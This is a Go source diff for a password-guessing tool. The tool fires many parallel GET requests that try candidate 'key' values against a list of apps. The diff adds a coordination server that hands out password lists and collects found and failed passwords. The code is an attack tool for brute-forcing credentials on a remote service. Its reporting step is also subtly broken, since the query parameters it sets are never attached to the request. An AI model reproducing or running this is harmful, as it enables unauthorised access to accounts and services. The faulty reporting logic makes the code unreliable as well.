@@ -26,6 +26,7 @@ var (
 	pwdFilename = flag.String("pwdfile", "", "Password list file")
 	parallel    = flag.Int("parallel", 10, "number of GETs to send at once")
 	mode        = flag.String("runas", "client", `Run as (valid value: "server", "client". Default: "client")`)
+	serverURL   = flag.String("url", "", "Server URL")
 	passwords   []string
 )
 
@@ -58,15 +59,15 @@ func rateLimited() bool {
 	return resp.StatusCode != 200
 }
 
-func checkResponse(resp *http.Response, req *http.Request) bool {
+func checkResponse(resp *http.Response, req *http.Request, appID int) (bool, bool) {
 	bytes, _ := ioutil.ReadAll(resp.Body)
 	if resp.StatusCode != 200 {
 		if resp.StatusCode == 408 {
-			return true
+			return true, false
 		}
 		log.Printf("Errored on %s:\n ", req.URL.String())
 		log.Println(string(bytes))
-		return false
+		return false, false
 	}
 
 	respJSON := make(map[string]interface{})
@@ -75,8 +76,40 @@ func checkResponse(resp *http.Response, req *http.Request) bool {
 		fmt.Println("")
 		log.Printf("On %s with Referer %s", req.URL.String(), req.Header["Referer"][0])
 		log.Printf("Got a response!: %v", respJSON)
+		if *serverURL == "" {
+			return false, true
+		}
+
+		u, err := url.Parse(*serverURL)
+		if err != nil {
+			log.Println(err)
+			return false, true
+		}
+		u.Query().Set("pwd", req.URL.Query().Get("key"))
+		u.Query().Set("appID", strconv.Itoa(appID))
+		http.DefaultClient.Get(u.String())
+		return false, true
 	}
-	return false
+	return false, false
+}
+
+func getPasswords(URL string) []string {
+	u, err := url.Parse(URL)
+	if err != nil {
+		log.Println(err)
+	}
+
+	u.Path = "get"
+	resp, err := http.DefaultClient.Get(u.String())
+	if err != nil {
+		log.Fatal(err)
+	}
+	var pwds []string
+	bytes, _ := ioutil.ReadAll(resp.Body)
+	json.Unmarshal(bytes, &pwds)
+	log.Println(pwds)
+
+	return pwds
 }
 
 func main() {
@@ -84,6 +117,7 @@ func main() {
 	// 	log.Println(http.ListenAndServe("localhost:6060", nil))
 	// }()
 
+	log.SetFlags(log.Lshortfile)
 	flag.Parse()
 	if *mode == "server" {
 		startServer()
@@ -92,7 +126,7 @@ func main() {
 		go startServer()
 	}
 
-	if *appFilename == "" || *pwdFilename == "" {
+	if *appFilename == "" || (*pwdFilename == "" && *mode == "client" && *serverURL == "") {
 		fmt.Println("USAGE: ")
 		flag.PrintDefaults()
 		os.Exit(1)
@@ -108,11 +142,15 @@ func main() {
 	}
 	apps := strings.Split(string(appOutput), "\n")
 
-	pwdOutput, err := ioutil.ReadFile(*pwdFilename)
-	if err != nil {
-		log.Fatal(err)
+	if *mode == "client" && *serverURL != "" {
+		passwords = getPasswords(*serverURL)
+	} else {
+		pwdOutput, err := ioutil.ReadFile(*pwdFilename)
+		if err != nil {
+			log.Fatal(err)
+		}
+		passwords = strings.Split(string(pwdOutput), "\n")
 	}
-	passwords = strings.Split(string(pwdOutput), "\n")
 
 	log.Printf("Sending %d GETs at once.", *parallel)
 	bar := pb.New(len(apps))
@@ -123,6 +161,7 @@ func main() {
 	bar.SetUnits(pb.Units(len(apps) * len(passwords)))
 	bar.Start()
 
+	invalidPwd := make(chan string, *parallel)
 	incProgress := make(chan struct{}, *parallel)
 	wait := new(sync.WaitGroup)
 	timeoutWait := new(sync.WaitGroup)
@@ -135,8 +174,26 @@ func main() {
 		}
 	}()
 
-	for _, appStr := range apps {
-		for _, password := range passwords {
+	go func() {
+		donePwd := make(map[string]int)
+		for {
+			pwd := <-invalidPwd
+			donePwd[pwd]++
+			if donePwd[pwd] == len(apps) && *serverURL != "" {
+				u, err := url.Parse(*serverURL)
+				if err != nil {
+					log.Println(err)
+				}
+				u.Path = "invalid"
+				u.Query().Set("pwd", pwd)
+				http.DefaultClient.Get(u.String())
+			}
+
+		}
+	}()
+
+	for _, password := range passwords {
+		for _, appStr := range apps {
 			timeoutWait.Wait()
 
 			if reqCount == *parallel {
@@ -166,7 +223,7 @@ func main() {
 					}
 				}
 
-				timeout := checkResponse(resp, req)
+				timeout, valid := checkResponse(resp, req, appID)
 				if timeout {
 					timeoutWait.Add(1)
 					defer timeoutWait.Done()
@@ -178,9 +235,12 @@ func main() {
 					if err != nil {
 						log.Fatal(err)
 					}
-					timeout = checkResponse(resp, req)
+					timeout, valid = checkResponse(resp, req, appID)
 				}
 
+				if !valid {
+					invalidPwd <- password
+				}
 				incProgress <- struct{}{}
 			}(password, appStr)
 
